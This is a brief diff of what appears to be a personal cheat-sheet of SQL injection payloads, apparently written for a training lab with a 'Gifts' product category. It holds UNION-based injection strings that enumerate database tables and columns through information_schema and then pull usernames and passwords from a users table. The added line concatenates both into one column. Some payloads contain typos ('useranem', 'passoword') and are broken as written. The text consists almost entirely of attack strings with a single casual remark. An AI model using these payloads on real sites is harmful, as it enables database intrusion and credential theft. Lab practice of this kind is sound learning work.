@@ -11,3 +11,5 @@ Gifts' union select table_name,NULL from information_schema.tables where table_s
 Gifts' union select NULL,column_name from information_schema.columns where table_schema = 'public' and table_name ='users'-- -
 
 Gifts' union select useranem,password from users-- -
+
+' union select NULL, concat(username,':',passoword) from users-- - -> ':' It depends on the site =)
